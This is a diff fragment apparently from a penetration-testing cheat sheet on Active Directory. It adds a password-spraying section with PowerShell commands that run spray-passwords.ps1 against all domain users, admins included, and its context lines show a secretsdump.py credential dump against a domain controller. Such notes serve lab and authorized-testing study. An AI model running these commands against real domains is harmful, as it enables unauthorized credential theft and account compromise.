@@ -215,6 +215,18 @@ $ python secretsdump.py -hashes :[empty_password_hash] '[domain]/[dc_computernam
 $ python secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'xor/xor-dc01$@x.x.x.x'
 ```
 
+Password spraying
+* Dumped plaintext cred or cracked hash for your user?
+* However, no creds/hashes for other users/SPN to use for lateral movement?
+* Does the plaintext cred follow some pattern? e.g. `IAmUser01, IAmUser02 ...`
+* Use `spray-passwords.ps1` script: https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
+```powershell
+# test password against all users in the AD, including admins.
+PS> .\spray-passwords.ps1 -Admin -Pass IamUser01
+PS> .\spray-passwords.ps1 -Admin -Pass IamUser02
+...
+```
+
 Have plaintext credentials?
 ```bash
 # RDP clients
